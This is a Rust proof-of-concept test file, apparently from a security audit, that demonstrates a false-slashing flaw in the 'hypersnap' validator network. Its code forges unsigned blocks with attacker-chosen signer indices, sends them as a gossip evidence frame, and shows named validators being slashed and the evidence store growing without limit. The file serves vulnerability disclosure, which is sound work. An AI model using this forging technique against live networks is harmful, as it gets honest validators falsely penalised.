// =====================================================================
// C1 - False slashing via unauthenticated `InboundEvidence` gossip.
//
// Standalone integration-test form of the PoC at
// `findings/poc/c1-false-slashing/poc.rs`. Pure integration test
// under `code/hypersnap/tests/` - zero production-code modification,
// explicit imports through the `hypersnap` crate's public API.
//
// What this PoC proves at commit 6449331:
//
//   A single, peer-supplied `HyperWireEvidence` gossip frame is
//   sufficient to cause arbitrary, attacker-chosen validators to
//   appear in `runtime.slashed_validators_for_epoch(...)` results -
//   without any threshold signature ever being checked, without
//   those validators ever signing a real block, and without any
//   rate limiting on the spam.
//
// Why it works:
//
//   1. `gossip_adapter::wire_to_event` (gossip_adapter.rs:82-88)
//      translates `Body::Evidence` into `HyperActorEvent::
//      InboundEvidence` with no signature check.
//   2. `HyperActor::dispatch` for `InboundEvidence` (actor.rs:
//      1288-1300) calls `detect_conflicting_blocks` then
//      `runtime.record_evidence` - no signature check.
//   3. `slashing::detect_conflicting_blocks` (slashing.rs:43-73)
//      only asserts heights match, epochs match, and hashes differ.
//      It does NOT re-verify the threshold signatures, despite the
//      comment at slashing.rs:22-24 claiming verifiers do.
//   4. `slashing_store::record` (slashing_store.rs:40-51) writes
//      the evidence to RocksDB keyed by
//      `(prefix, epoch, height, sorted_hash_pair)`.
//   5. `runtime::slashed_validators_for_epoch` (runtime.rs:3825-
//      3856) reads the persisted evidence and walks `signer_indices`
//      from either block as ground truth - they are 1-based indices
//      into the sorted active set.
//
// To run from `code/hypersnap/`:
//     cargo test --test c1_poc
// or build-only:
//     cargo test --no-run --test c1_poc
//
// This file ONLY uses the public surface of the `hypersnap` crate
// and its public deps (`hypersnap_crypto`, `rand`, `tempfile`). No
// production code is modified by this PoC.
// =====================================================================

use hypersnap::hyper::actor::{HyperActor, HyperActorEvent, HyperActorOutbound};
use hypersnap::hyper::gossip_adapter::wire_to_event;
use hypersnap::hyper::runtime::{HyperRuntime, HyperRuntimeConfig};
use hypersnap::hyper::validator_score::ScoreWeights;
use hypersnap::hyper::{
    HyperBlock, HyperBlockMetadata, HyperBlockSignature, HyperEnvelope, DEFAULT_PROTOCOL_CHAIN_ID,
};
use hypersnap::proto;
use hypersnap::storage::db::RocksDB;
use hypersnap_crypto::kzg::KzgSrs;
use hypersnap_crypto::kzg_lagrange::VERKLE_DOMAIN;
use rand::rngs::OsRng;
use std::sync::Arc;

/// Build a `HyperBlock` with the attacker-chosen `signer_indices`, a
/// chosen `parent_hash` byte (for the DoS stretch - varying this
/// varies the block hash), and ZERO signature bytes. Nothing here
/// is ever signed; this is exactly the payload shape a hostile peer
/// can craft.
fn forge_block(
    height: u64,
    epoch: u64,
    state_root: u8,
    parent_hash_byte: u8,
    signer_indices: Vec<u64>,
) -> HyperBlock {
    HyperBlock {
        envelope: HyperEnvelope {
            metadata: HyperBlockMetadata {
                canonical_block_id: height,
                parent_hash: vec![parent_hash_byte; 32],
                hyper_state_root: vec![state_root; 48],
                extra_rules_version: 0,
                retained_message_count: 0,
                missed_proposals: vec![],
                snapchain_anchor_block: 0,
                snapchain_anchor_hash: vec![],
                snapchain_range_start_block: 0,
                snapchain_range_root: vec![],
                snapchain_anchor_timestamp: 0,
            },
            payload: vec![],
        },
        signature: HyperBlockSignature {
            epoch,
            signer_indices,
            // CRITICAL: empty group_address and empty ecdsa_signature.
            // The attacker never holds the epoch's group key; they
            // simply omit any signature material.
            group_address: Vec::new(),
            ecdsa_signature: Vec::new(),
        },
    }
}

/// Transcribed verbatim from `gossip_adapter.rs:203-228` because the
/// production `encode_hyper_block` is module-private. Field-by-field
/// copy: `proto::HyperBlock { envelope, signature }`. This lets the
/// integration test feed a forged proto wire frame into the public
/// `wire_to_event` entrypoint with no production-code change.
fn encode_hyper_block_inline(block: HyperBlock) -> proto::HyperBlock {
    proto::HyperBlock {
        envelope: Some(proto::HyperEnvelope {
            metadata: Some(proto::HyperBlockMetadata {
                canonical_block_id: block.envelope.metadata.canonical_block_id,
                parent_hash: block.envelope.metadata.parent_hash,
                hyper_state_root: block.envelope.metadata.hyper_state_root,
                extra_rules_version: block.envelope.metadata.extra_rules_version,
                retained_message_count: block.envelope.metadata.retained_message_count,
                missed_proposals: vec![],
                snapchain_anchor_block: 0,
                snapchain_anchor_hash: vec![],
                snapchain_range_start_block: 0,
                snapchain_range_root: vec![],
                snapchain_anchor_timestamp: 0,
            }),
            payload: block.envelope.payload,
        }),
        signature: Some(proto::HyperBlockSignature {
            epoch: block.signature.epoch,
            signer_indices: block.signature.signer_indices,
            group_address: block.signature.group_address,
            ecdsa_signature: block.signature.ecdsa_signature,
        }),
    }
}

/// Wrap a forged block pair into the over-the-wire proto envelope a
/// hostile peer would publish on `TOPIC_HYPER_EVIDENCE`.
fn forge_wire_evidence(block_a: &HyperBlock, block_b: &HyperBlock) -> proto::HyperWireMessage {
    proto::HyperWireMessage {
        body: Some(proto::hyper_wire_message::Body::Evidence(
            proto::HyperWireEvidence {
                block_a: Some(encode_hyper_block_inline(block_a.clone())),
                block_b: Some(encode_hyper_block_inline(block_b.clone())),
            },
        )),
    }
}

/// Build a `HyperRuntimeConfig` with 4 bootstrap validators in
/// deterministic key order `vk(1)..vk(4)`. Returns the config and the
/// bootstrap vec separately so caller code can build the parallel
/// active-set BTreeMap.
fn build_config_with_bootstrap(
    db: Arc<RocksDB>,
    srs: Arc<KzgSrs>,
    bootstrap: Vec<(Vec<u8>, Vec<u8>, Vec<u8>)>,
) -> HyperRuntimeConfig {
    HyperRuntimeConfig {
        db,
        srs,
        mempool_capacity: 100,
        score_weights: ScoreWeights::default(),
        starting_epoch: 0,
        bootstrap_validators: bootstrap,
        max_reward_per_epoch: None,
        max_reward_per_epoch_per_market: std::collections::HashMap::new(),
        cutover_snapchain_block: 0,
        min_validator_trust_score: 0.0,
        protocol_chain_id: DEFAULT_PROTOCOL_CHAIN_ID,
        scoring_params: proof_of_quality::ScoringParams::default(),
        seed_max_fid: 50_000,
        retro_vesting_on_protocol_epochs:
            hypersnap::hyper::runtime::RETRO_VESTING_ON_PROTOCOL_EPOCHS_DEFAULT,
        local_transport_secret_bytes: [0u8; 32],
    }
}

/// (1) End-to-end: gossip wire frame -> adapter -> actor -> runtime
/// -> query. Confirms `slashed_validators_for_epoch(epoch)` returns
/// the attacker-chosen indices despite zero signatures on either
/// block.
#[tokio::test]
async fn c1_unsigned_evidence_slashes_attacker_chosen_validators() {
    // ----- setup: runtime with 4 bootstrap validators -----
    let mut rng = OsRng;
    let srs = Arc::new(KzgSrs::random_unsafe(&mut rng, VERKLE_DOMAIN));
    let dir = tempfile::TempDir::new().unwrap();
    let db = RocksDB::new(dir.path().to_str().unwrap());
    db.open().unwrap();
    let bootstrap: Vec<(Vec<u8>, Vec<u8>, Vec<u8>)> = (1u8..=4)
        .map(|i| (vec![i; 32], vec![i; 48], vec![i; 32]))
        .collect();
    let config = build_config_with_bootstrap(Arc::new(db), srs, bootstrap.clone());
    let runtime = HyperRuntime::new(config);

    // ----- forge: two unsigned blocks at (height=42, epoch=0) -----
    // Attacker frames validators 1, 2, and 4 (i.e. vk([1;32]),
    // vk([2;32]), vk([4;32])). Validator 3 is left alone.
    let attacker_chosen_a: Vec<u64> = vec![1u64];
    let attacker_chosen_b: Vec<u64> = vec![2u64, 4u64];
    let block_a = forge_block(42, 0, 0xaa, 0x11, attacker_chosen_a.clone());
    let block_b = forge_block(42, 0, 0xbb, 0x22, attacker_chosen_b.clone());

    // Sanity: neither block carries any signature material.
    assert!(block_a.signature.ecdsa_signature.is_empty());
    assert!(block_a.signature.group_address.is_empty());
    assert!(block_b.signature.ecdsa_signature.is_empty());
    assert!(block_b.signature.group_address.is_empty());

    // ----- transport: wrap the forged blocks in the gossip wire frame -----
    let wire = forge_wire_evidence(&block_a, &block_b);
    // Translate the wire frame through the production adapter. THIS
    // is the path a real gossip publish/receive would take. Confirms
    // the adapter itself does no signature verification.
    let event = wire_to_event(wire).expect("adapter should accept");
    match &event {
        HyperActorEvent::InboundEvidence { .. } => {}
        _ => panic!("expected InboundEvidence event from adapter"),
    }

    // ----- drive: hand the event to the actor -----
    let outbound = HyperActor::drive_events(runtime, vec![event]).await;

    // ----- assert step 1: actor accepted, emitted EvidenceConfirmed -----
    let confirmed = outbound
        .iter()
        .filter(|o| matches!(o, HyperActorOutbound::EvidenceConfirmed(_)))
        .count();
    let errors = outbound
        .iter()
        .filter(|o| matches!(o, HyperActorOutbound::EventError(_)))
        .count();
    assert_eq!(
        confirmed, 1,
        "unsigned evidence should be CONFIRMED by actor; outbound count: \
         confirmed={} errors={}",
        confirmed, errors,
    );
    assert_eq!(
        errors, 0,
        "no signature error should be emitted; outbound count: \
         confirmed={} errors={}",
        confirmed, errors,
    );

    // ----- assert step 2: re-open the DB, query slashed set -----
    // `drive_events` consumes `runtime`, so we re-open the same
    // RocksDB directory to query the persisted evidence.
    let db2 = RocksDB::new(dir.path().to_str().unwrap());
    db2.open().unwrap();
    let srs2 = Arc::new(KzgSrs::random_unsafe(&mut OsRng, VERKLE_DOMAIN));
    let config2 = build_config_with_bootstrap(Arc::new(db2), srs2, bootstrap.clone());
    let runtime2 = HyperRuntime::new(config2);

    // Build the active-set BTreeMap the same way the runtime does
    // internally: validator_key -> (bls_pk, transport_pk).
    let active_set: std::collections::BTreeMap<Vec<u8>, (Vec<u8>, Vec<u8>)> = bootstrap
        .iter()
        .map(|(vk, bls, tp)| (vk.clone(), (bls.clone(), tp.clone())))
        .collect();
    let slashed = runtime2
        .slashed_validators_for_epoch(0, &active_set)
        .expect("query should succeed");

    // ----- assert step 3: attacker-named victims are slashed -----
    let vk = |i: u8| vec![i; 32];
    assert!(
        slashed.contains(&vk(1)),
        "vk(1) should be slashed (attacker named in signer_indices); slashed={:?}",
        slashed
    );
    assert!(
        slashed.contains(&vk(2)),
        "vk(2) should be slashed (attacker named in signer_indices); slashed={:?}",
        slashed
    );
    assert!(
        slashed.contains(&vk(4)),
        "vk(4) should be slashed (attacker named in signer_indices); slashed={:?}",
        slashed
    );
    assert!(
        !slashed.contains(&vk(3)),
        "vk(3) was not named by attacker; should NOT be slashed; slashed={:?}",
        slashed
    );
    assert_eq!(
        slashed.len(),
        3,
        "exactly the three attacker-named victims should appear; slashed={:?}",
        slashed
    );

    // ----- PROVEN -----
    // A single gossip frame, with two completely unsigned blocks,
    // caused three named validators to appear in the runtime's
    // authoritative slashed-validators set for epoch 0. No threshold
    // signature was ever checked at any layer on the gossip ->
    // adapter -> actor -> runtime -> query path.
    drop(dir);
}

/// (2) Stretch: storage amplification - varying any metadata field
/// on `block_b` produces a new RocksDB key. 64 frames -> 64 rows.
#[tokio::test]
async fn c1_storage_amplification_one_row_per_metadata_variant() {
    let mut rng = OsRng;
    let srs = Arc::new(KzgSrs::random_unsafe(&mut rng, VERKLE_DOMAIN));
    let dir = tempfile::TempDir::new().unwrap();
    let db = RocksDB::new(dir.path().to_str().unwrap());
    db.open().unwrap();
    let bootstrap: Vec<(Vec<u8>, Vec<u8>, Vec<u8>)> = (1u8..=4)
        .map(|i| (vec![i; 32], vec![i; 48], vec![i; 32]))
        .collect();
    let config = build_config_with_bootstrap(Arc::new(db), srs, bootstrap.clone());
    let runtime = HyperRuntime::new(config);

    // 64 distinct evidence frames, all at (height=99, epoch=7), only
    // varying `parent_hash` on block_b. signer_indices stays [2,4] -
    // i.e. the SAME victims are slashed by each row; we're showing
    // the store grows even when the slashed set does not.
    let mut events = Vec::with_capacity(64);
    for v in 0u8..64 {
        // block_a uses 0xFF (outside the 0..64 loop range) so block_b
        // can never collide with it. When block_b's parent_hash byte
        // equals block_a's, the two blocks become byte-identical
        // (signer_indices is NOT part of hyper_block_hash - that's
        // precisely the property the C1 attack exploits), and
        // detect_conflicting_blocks would return Err(SameBlock).
        let block_a = forge_block(99, 7, 0xaa, 0xFF, vec![1u64]);
        let block_b = forge_block(99, 7, 0xaa, v, vec![2u64, 4u64]);
        events.push(HyperActorEvent::InboundEvidence { block_a, block_b });
    }

    let outbound = HyperActor::drive_events(runtime, events).await;
    let confirmed = outbound
        .iter()
        .filter(|o| matches!(o, HyperActorOutbound::EvidenceConfirmed(_)))
        .count();
    assert_eq!(
        confirmed, 64,
        "every frame should be confirmed; got {} EvidenceConfirmed",
        confirmed,
    );

    // Re-open and count persisted evidence rows for epoch 7.
    let db2 = RocksDB::new(dir.path().to_str().unwrap());
    db2.open().unwrap();
    let srs2 = Arc::new(KzgSrs::random_unsafe(&mut OsRng, VERKLE_DOMAIN));
    let config2 = build_config_with_bootstrap(Arc::new(db2), srs2, bootstrap.clone());
    let runtime2 = HyperRuntime::new(config2);
    let ev = runtime2
        .evidence_for_epoch(7)
        .expect("query should succeed");
    assert_eq!(
        ev.len(),
        64,
        "each metadata-varied block_b should produce a new RocksDB key"
    );
    drop(dir);
}
